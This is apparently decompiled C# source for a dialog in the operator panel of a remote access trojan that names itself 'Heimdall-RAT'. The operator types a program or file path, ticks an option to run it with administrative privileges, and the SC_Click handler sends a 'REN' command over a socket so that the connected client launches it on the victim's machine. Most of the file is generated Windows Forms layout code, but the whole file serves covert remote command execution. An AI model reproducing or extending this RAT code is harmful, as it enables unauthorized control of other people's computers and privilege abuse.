using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class NewTGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("NewTP")]
	private TextBox _NewTP;

	[AccessedThroughProperty("AdminN")]
	private CheckBox _AdminN;

	[AccessedThroughProperty("C")]
	private Button _C;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Cont")]
	private Button _Cont;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	public int sock;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox NewTP
	{
		[DebuggerNonUserCode]
		get
		{
			return _NewTP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NewTP = value;
		}
	}

	internal virtual CheckBox AdminN
	{
		[DebuggerNonUserCode]
		get
		{
			return _AdminN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_AdminN = value;
		}
	}

	internal virtual Button C
	{
		[DebuggerNonUserCode]
		get
		{
			return _C;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = C_Click;
			if (_C != null)
			{
				((Control)_C).remove_Click(eventHandler);
			}
			_C = value;
			if (_C != null)
			{
				((Control)_C).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Button Cont
	{
		[DebuggerNonUserCode]
		get
		{
			return _Cont;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SC_Click;
			if (_Cont != null)
			{
				((Control)_Cont).remove_Click(eventHandler);
			}
			_Cont = value;
			if (_Cont != null)
			{
				((Control)_Cont).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	[DebuggerNonUserCode]
	public NewTGR()
	{
		((Form)this).add_Load((EventHandler)NewTGR_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_039e: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a8: Expected O, but got Unknown
		//IL_04da: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e4: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(NewTGR));
		Label1 = new Label();
		NewTP = new TextBox();
		AdminN = new CheckBox();
		C = new Button();
		Label2 = new Label();
		PictureBox1 = new PictureBox();
		Cont = new Button();
		Label3 = new Label();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		Point location = new Point(9, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(357, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Type the name or path of program, document , picture, etc ..");
		((Control)NewTP).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox newTP = NewTP;
		location = new Point(12, 48);
		((Control)newTP).set_Location(location);
		((Control)NewTP).set_Name("NewTP");
		TextBox newTP2 = NewTP;
		size = new Size(346, 21);
		((Control)newTP2).set_Size(size);
		((Control)NewTP).set_TabIndex(1);
		((ButtonBase)AdminN).set_AutoSize(true);
		CheckBox adminN = AdminN;
		location = new Point(12, 75);
		((Control)adminN).set_Location(location);
		((Control)AdminN).set_Name("AdminN");
		CheckBox adminN2 = AdminN;
		size = new Size(15, 14);
		((Control)adminN2).set_Size(size);
		((Control)AdminN).set_TabIndex(2);
		((ButtonBase)AdminN).set_UseVisualStyleBackColor(true);
		Button c = C;
		location = new Point(203, 96);
		((Control)c).set_Location(location);
		((Control)C).set_Name("C");
		Button c2 = C;
		size = new Size(75, 23);
		((Control)c2).set_Size(size);
		((Control)C).set_TabIndex(3);
		((ButtonBase)C).set_Text("Cancel");
		((ButtonBase)C).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(52, 76);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(216, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Create this task with administrative privileges");
		PictureBox1.set_Image((Image)(object)Resources._039);
		PictureBox pictureBox = PictureBox1;
		location = new Point(30, 74);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(22, 18);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(5);
		PictureBox1.set_TabStop(false);
		Button cont = Cont;
		location = new Point(284, 96);
		((Control)cont).set_Location(location);
		((Control)Cont).set_Name("Cont");
		Button cont2 = Cont;
		size = new Size(75, 23);
		((Control)cont2).set_Size(size);
		((Control)Cont).set_TabIndex(6);
		((ButtonBase)Cont).set_Text("Continue");
		((ButtonBase)Cont).set_UseVisualStyleBackColor(true);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label5 = Label3;
		location = new Point(9, 27);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(172, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(7);
		Label3.set_Text("and client will open it for you");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(370, 129);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Cont);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)C);
		((Control)this).get_Controls().Add((Control)(object)AdminN);
		((Control)this).get_Controls().Add((Control)(object)NewTP);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("NewTGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("CT");
		((Form)this).set_TopMost(true);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void SC_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		if (NewTP.get_Text().Length == 0)
		{
			MessageBox.Show("this is not a valid program name or path", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		MyProject.Forms.FrmMAINGR.s.Send(sock, "REN" + MyProject.Forms.FrmMAINGR.Key + NewTP.get_Text() + MyProject.Forms.FrmMAINGR.Key + AdminN.get_Checked());
		((Form)this).Close();
	}

	private void C_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void NewTGR_Load(object sender, EventArgs e)
	{
	}
}
